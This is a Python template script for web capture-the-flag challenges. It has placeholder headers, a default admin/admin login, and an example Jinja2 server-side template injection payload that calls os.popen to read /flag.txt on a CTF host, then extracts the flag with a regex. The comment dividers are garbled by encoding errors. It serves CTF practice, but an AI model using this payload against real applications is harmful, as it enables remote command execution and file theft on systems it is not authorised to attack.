#!/usr/bin/env python3
"""
Challenge: [Name]
CTF: [CTF Name]
Category: Web
Date: YYYY-MM-DD

Vulnerability: [SQLi / SSTI / LFI / RCE / etc.]
"""

import requests
import re

# â”€â”€â”€ Config â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
TARGET   = "http://target.ctf"
FLAG_PAT = r'CTF\{[^}]+\}'

s = requests.Session()
s.headers.update({
    'User-Agent': 'Mozilla/5.0'
})

# â”€â”€â”€ Auth (if needed) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
def login():
    r = s.post(f"{TARGET}/login", data={
        "username": "admin",
        "password": "admin"
    })
    print(f"[+] Login: {r.status_code}")

# â”€â”€â”€ Exploit â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
def exploit():
    # Example: SSTI
    payload = "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}"
    
    r = s.post(f"{TARGET}/vuln", data={
        "input": payload
    })
    
    print(f"[+] Response ({r.status_code}):")
    print(r.text[:500])
    
    # Extract flag
    flags = re.findall(FLAG_PAT, r.text)
    if flags:
        print(f"\nğŸ FLAG: {flags[0]}")
    else:
        print("\n[-] Flag not found in response")
    
    return r

# â”€â”€â”€ Run â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
if __name__ == '__main__':
    login()
    exploit()
